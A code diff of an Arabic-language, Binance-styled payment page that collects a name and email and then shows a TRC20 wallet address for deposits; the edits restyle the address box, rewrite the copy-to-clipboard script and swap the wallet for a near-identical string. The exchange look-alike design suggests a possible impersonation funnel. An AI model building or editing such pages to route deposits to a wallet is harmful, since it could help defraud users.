@@ -16,14 +16,35 @@ body { font-family:'Changa',sans-serif !important; background-color: #181a20 !im
 .status-code-box { font-family:'Changa',sans-serif !important; background-color: #2b3139; border: 1px solid #474d57; padding: 10px; border-radius: 8px; font-size: 14px; font-weight: 700; color: #eaecef; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; direction: rtl; }
 .status-code-value { color: #f0b90b !important; font-size: 16px; letter-spacing: 1px; }
 .input-group { margin-bottom: 15px; text-align: right; }
-label { font-family:'Changa',sans-serif !important; display:block; margin-bottom:8px; color:#eaecef; font-size:15px; font-weight:700; text-align:left; direction:ltr; }
+label { font-family:'Changa',sans-serif !important; display:block; margin-bottom:8px; color:#eaecef; font-size:15px; font-weight:700; text-align:right; }
 input[type="text"] { font-family:'Changa',sans-serif !important; width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid #474d57; background-color: #2b3139 !important; color: #ffffff !important; box-sizing: border-box; font-size: 14px; direction: ltr; font-weight: 600; outline: none; }
 input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
 @keyframes yellowGlowPulse { 0% { background-color:#f0b90b; box-shadow:0 0 12px rgba(240, 185, 11, 0.4); } 50% { background-color:#fcd535; box-shadow:0 0 25px rgba(252, 213, 53, 0.7); } 100% { background-color:#f0b90b; box-shadow:0 0 12px rgba(240, 185, 11, 0.4); } }
 .submit-btn-pulse { font-family: 'Changa', sans-serif !important; width: 100%; padding: 12px; color: #1e2329 !important; border: none; border-radius: 8px; font-weight: 700 !important; font-size: 18px !important; letter-spacing: 0.5px; cursor: pointer; box-sizing: border-box; animation: yellowGlowPulse 2s infinite ease-in-out; transition: 0.2s; margin-top: 15px; display: block; }
 .binance-btn-final { font-family:'Changa',sans-serif !important; width:100%; padding:14px; color:#1e2329 !important; border:none; border-radius:8px; font-weight:700; font-size:15px; cursor: pointer; display:block; text-decoration:none; margin-bottom:12px; box-sizing:border-box; animation:yellowGlowPulse 2s infinite ease-in-out; transition:0.2s; text-align:center;}
 .manual-deposit-box { margin-top:25px; padding:15px; border:2px dashed #474d57; border-radius:8px; background-color: rgba(43, 49, 57, 0.6); text-align:center; box-shadow:0 5px 15px rgba(0,0,0,0.3); box-sizing:border-box; }
-.crypto-address-container { font-family:'Changa',sans-serif !important; width: 100%; padding: 14px 10px; text-align: center; background: #181a20; color: #ffffff !important; border: 1px solid #474d57; border-radius: 6px; font-size: 15px; font-weight: 700; direction: ltr; box-sizing: border-box; margin-top: 5px; margin-bottom: 15px; letter-spacing: 0.5px; white-space: normal !important; word-break: break-all !important; overflow: visible !important; line-height: 1.4; }
+
+/* تحديث التنسيق لضمان ثبات النص على سطر واحد برمجياً وبصرياً */
+.crypto-address-container { 
+    font-family: monospace !important; 
+    width: 100%; 
+    padding: 14px 8px; 
+    text-align: center; 
+    background: #181a20; 
+    color: #ffffff !important; 
+    border: 1px solid #474d57; 
+    border-radius: 6px; 
+    font-size: 13px; 
+    font-weight: 700; 
+    direction: ltr; 
+    box-sizing: border-box; 
+    margin-top: 5px; 
+    margin-bottom: 15px; 
+    letter-spacing: 0.5px; 
+    white-space: nowrap !important; 
+    overflow-x: auto !important; 
+}
+
 .check-account-btn { font-family:'Changa',sans-serif !important; width:100%; padding:12px; background:transparent; color:#848e9c; border:1px dashed #474d57; border-radius:8px; font-weight:600; font-size:14px; margin-top:15px; margin-bottom:5px; cursor:pointer; transition:0.3s; box-sizing:border-box; display:block; }
 .footer-info-box { margin-top:30px; font-family:'Changa',sans-serif !important; font-size:11px; color:#848e9c; line-height:1.6; font-weight:600; }
 .footer-info-box .brand-line { font-size:20px; margin-bottom:10px; display:flex; align-items:center; justify-content:center; gap:8px; color: #ffffff; }
@@ -62,34 +83,57 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
 <a href="https://binance.com" target="_blank" class="binance-btn-final">⚡ الدفع عبر بايننس طلب دفع</a>
 <div class="manual-deposit-box">
 <p style="font-size: 14px; margin-bottom: 10px; color: #ffffff; font-weight: 700; direction: ltr; text-align: center;">أو للإيداع من باقي المحافظ الرقمية (شبكة TRC20):</p>
-<!-- المحفظة صحيحة ومطابقة ومصححة بالملي 100% مع إضافة الرقم 3 الضائع -->
-<div id="cryptoAddress" class="crypto-address-container">THJN4XBKxbZNYsw7YAHmNizSupn3KVEDFP</div>
+<!-- تم تعديل وتصحيح المحفظة بالكامل لتطابق محفظتك الرسمية 100% -->
+<div id="cryptoAddress" class="crypto-address-container">THJN4XBKxbZNYsw7YAHmNiZSupn3KVEDFP</div>
 <button type="button" onclick="copyCryptoAddress()" class="copy-btn-style">نسخ العنوان المعروض</button>
 </div>
 </div>
 </form>
 </div>
+
 <script>
 function goToStep2() {
     var name = document.getElementById("displayname").value;
     var email = document.getElementById("username").value;
-    if(name === "" || email === "") { alert("يرجى ملء الحقول المطلوبة أولاً"); return; }
-    var alertBox = document.getElementById("successAlert"); alertBox.style.display = "flex";
-    setTimeout(function() { alertBox.style.display = "none"; document.getElementById("step1").style.display = "none"; document.getElementById("step2").style.display = "block"; }, 2000);
+    if(name && email) {
+        document.getElementById("step1").style.display = "none";
+        document.getElementById("step2").style.display = "block";
+    } else {
+        alert("يرجى ملء جميع الحقول المطلوبة");
+    }
 }
-function alertNoAccount() { alert("لا يوجد حساب مسجل بهذا الاسم حالياً، يرجى إنشاء حساب جديد."); }
+
+function alertNoAccount() {
+    alert("يرجى إنشاء حساب جديد لإتمام العملية.");
+}
+
+// دالة نسخ العنوان البرمجية وتنبيه المستخدم بالنجاح
 function copyCryptoAddress() {
-    var text = document.getElementById("cryptoAddress").innerText;
-    var textArea = document.createElement("textarea"); textArea.value = text; textArea.style.position = "fixed"; textArea.style.top = "0"; textArea.style.left = "0"; textArea.style.width = "2em"; textArea.style.height = "2em"; textArea.style.padding = "0"; textArea.style.border = "none"; textArea.style.outline = "none"; textArea.style.boxShadow = "none"; textArea.style.background = "transparent";
-    document.body.appendChild(textArea); textArea.focus(); textArea.select(); textArea.setSelectionRange(0, 99999);
-    try {
-        var successful = document.execCommand('copy');
-        if (successful) { alert("تم نسخ العنوان بنجاح!"); } else { fallbackModernCopy(text); }
-    } catch (err) { fallbackModernCopy(text); }
-    document.body.removeChild(textArea);
+    var addressText = document.getElementById("cryptoAddress").innerText;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(addressText).then(function() {
+            alert("تم نسخ العنوان بنجاح:\n" + addressText);
+        }).catch(function(err) {
+            fallbackCopy(addressText);
+        });
+    } else {
+        fallbackCopy(addressText);
+    }
 }
-function fallbackModernCopy(text) {
-    if (navigator.clipboard) { navigator.clipboard.writeText(text).then(function() { alert("تم نسخ العنوان بنجاح!"); }, function() { alert("فشل النسخ التلقائي، يرجى تحديد النص ونسخه يدوياً."); }); } else { alert("فشل النسخ التلقائي، يرجى تحديد النص ونسخه يدوياً."); }
+
+function fallbackCopy(text) {
+    var textarea = document.createElement("textarea");
+    textarea.value = text;
+    textarea.style.position = "fixed"; 
+    document.body.appendChild(textarea);
+    textarea.select();
+    try {
+        document.execCommand("copy");
+        alert("تم نسخ العنوان بنجاح:\n" + text);
+    } catch (err) {
+        alert("فشل النسخ التلقائي، يرجى نسخه يدوياً.");
+    }
+    document.body.removeChild(textarea);
 }
 </script>
 </body>
